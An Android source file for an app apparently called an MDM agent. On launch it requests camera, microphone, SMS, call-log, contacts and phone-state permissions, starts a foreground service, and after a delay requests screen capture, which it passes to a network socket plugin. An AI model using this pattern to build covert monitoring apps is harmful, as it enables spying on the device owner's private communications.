package com.mdmagent.app;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {

    private static final int PERM_REQUEST_CODE = 1001;

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
    };

    private ActivityResultLauncher<Intent> screenCaptureLauncher;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(MdmPlugin.class);
        registerPlugin(NativeSocketPlugin.class);
        super.onCreate(savedInstanceState);

        // Register AFTER super.onCreate so lifecycle is ready
        screenCaptureLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
                    MediaProjectionManager mpm =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                    NativeSocketPlugin.onScreenCaptureApproved(
                        mpm.getMediaProjection(result.getResultCode(), result.getData())
                    );
                } else {
                    NativeSocketPlugin.onScreenCaptureDenied();
                }
            }
        );

        startForegroundService(new Intent(this, MdmForegroundService.class));
        requestMissingPermissions();

        // Request screen capture permission upfront — 2 s delay lets other dialogs settle first
        new Handler(Looper.getMainLooper()).postDelayed(this::launchScreenCapture, 2000);
    }

    public void launchScreenCapture() {
        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        screenCaptureLauncher.launch(mpm.createScreenCaptureIntent());
    }

    private void requestMissingPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                missing.add(perm);
        }
        if (!missing.isEmpty())
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERM_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQUEST_CODE)
            startForegroundService(new Intent(this, MdmForegroundService.class));
    }
}
